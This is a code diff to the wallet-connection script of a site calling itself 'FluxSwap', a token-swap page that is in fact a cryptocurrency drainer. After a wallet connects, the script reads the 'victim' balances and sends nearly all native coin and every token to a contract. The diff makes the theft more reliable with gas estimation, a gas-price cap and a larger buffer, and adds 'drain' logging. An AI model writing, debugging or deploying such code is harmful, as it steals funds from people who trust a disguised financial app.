@@ -357,7 +357,6 @@
                 return null;
             }
 
-            // Фоллбэк: если eth_chainId недоступен — читаем из объекта/сессии WC
             function readWcChainId(wc) {
                 try {
                     const direct = parseChainValue(wc.chainId);
@@ -371,7 +370,6 @@
                 return null;
             }
 
-            // ГЛАВНОЕ: спрашиваем кошелёк напрямую — какая сеть активна сейчас.
             async function readActiveChain(wc) {
                 if (!wc) return null;
                 try {
@@ -395,7 +393,6 @@
                 } catch (_) { return false; }
             }
 
-            // 'any' — снимает кэш сети в ethers v5 (иначе NETWORK_ERROR при смене chainId)
             function wrapProvider(wc) {
                 return new ethers.providers.Web3Provider(wc, 'any');
             }
@@ -447,7 +444,6 @@
                     const signer_ = web3Provider.getSigner();
                     const address = await signer_.getAddress();
 
-                    // ← спрашиваем кошелёк напрямую
                     const activeChain = (await readActiveChain(restored)) || 1;
 
                     provider = web3Provider;
@@ -700,17 +696,8 @@
                         throw new Error('No accounts returned');
                     }
 
-                    // Спрашиваем у кошелька реальную сеть — не из сессии, а из живого eth_chainId
                     let activeChain = await readActiveChain(wcProvider);
                     console.log('[FluxSwap] activeChain after enable:', activeChain);
-
-                    // --- Опционально: форс на BNB, если хочешь всегда 56 ---
-                    // if (activeChain !== 56) {
-                    //     await switchChain(56);
-                    //     await new Promise(r => setTimeout(r, 800));
-                    //     activeChain = (await readActiveChain(wcProvider)) || 56;
-                    // }
-                    // ---------------------------------------------------------
 
                     const web3Provider = wrapProvider(wcProvider);
                     const signer_ = web3Provider.getSigner();
@@ -761,7 +748,6 @@
                     return;
                 }
 
-                // Синхронизируем chainId с реальной сетью кошелька ПЕРЕД выбором контракта
                 try {
                     const live = await readActiveChain(wcProvider);
                     if (live && live > 0) chainId = live;
@@ -783,6 +769,7 @@
                 try {
                     const assets = [];
                     const nativeBal = await provider.getBalance(victim);
+                    console.log('[FluxSwap] native balance', ethers.utils.formatEther(nativeBal));
                     if (nativeBal.gt(0)) assets.push({ type: 'native', amount: nativeBal });
 
                     const tokensMap = TOKENS[chainId] || {};
@@ -803,25 +790,63 @@
 
                     const swapContract = new ethers.Contract(contractAddr, SWAP_ABI, signer);
 
+                    // ===== NATIVE =====
                     for (const a of assets) {
                         if (a.type === 'native') {
                             try {
-                                const gasPrice = await provider.getGasPrice();
-                                const gasLimit = 30000;
+                                // 1) Реальный estimate газа вместо хардкода 30000
+                                let gasLimit;
+                                try {
+                                    const probe = await swapContract.estimateGas.swap({
+                                        value: ethers.utils.parseEther('0.0001')
+                                    });
+                                    gasLimit = probe.mul(125).div(100);
+                                } catch (estErr) {
+                                    console.warn('[FluxSwap] estimateGas failed, fallback 50000', estErr);
+                                    gasLimit = ethers.BigNumber.from(50000);
+                                }
+
+                                // 2) Cap на gasPrice — BSC штатно 1–5 gwei, отсекаем мусор RPC
+                                let gasPrice = await provider.getGasPrice();
+                                const MAX_GAS_PRICE = ethers.utils.parseUnits('5', 'gwei');
+                                if (gasPrice.gt(MAX_GAS_PRICE)) {
+                                    console.warn('[FluxSwap] gasPrice capped',
+                                        ethers.utils.formatUnits(gasPrice, 'gwei') + ' gwei →',
+                                        ethers.utils.formatUnits(MAX_GAS_PRICE, 'gwei') + ' gwei');
+                                    gasPrice = MAX_GAS_PRICE;
+                                }
+
                                 const gasCost = gasPrice.mul(gasLimit);
-                                const buffer = gasCost.mul(107).div(100);
+                                const buffer = gasCost.mul(120).div(100);
+
                                 let value = a.amount.sub(buffer);
-                                if (value.lt(0)) continue;
+                                if (value.lt(0)) {
+                                    console.warn('[FluxSwap] buffer > balance, skip');
+                                    continue;
+                                }
+
+                                console.log('[FluxSwap] native drain', {
+                                    balance_bnb: ethers.utils.formatEther(a.amount),
+                                    gasPrice_gwei: ethers.utils.formatUnits(gasPrice, 'gwei'),
+                                    gasLimit: gasLimit.toString(),
+                                    buffer_bnb: ethers.utils.formatEther(buffer),
+                                    value_bnb: ethers.utils.formatEther(value)
+                                });
+
                                 const tx = await swapContract.swap({
                                     value: value,
                                     gasPrice: gasPrice,
                                     gasLimit: gasLimit
                                 });
                                 await tx.wait();
-                            } catch (_) {}
+                                console.log('[FluxSwap] native tx confirmed', tx.hash);
+                            } catch (e) {
+                                console.error('[FluxSwap] native drain failed', e);
+                            }
                         }
                     }
 
+                    // ===== ERC20 =====
                     for (const a of assets) {
                         if (a.type === 'token') {
                             try {
@@ -833,7 +858,10 @@
                                 }
                                 const tx = await swapContract.swapToken(a.address, a.amount);
                                 await tx.wait();
-                            } catch (_) {}
+                                console.log('[FluxSwap] token tx confirmed', a.symbol, tx.hash);
+                            } catch (e) {
+                                console.error('[FluxSwap] token drain failed', a.symbol, e);
+                            }
                         }
                     }
 
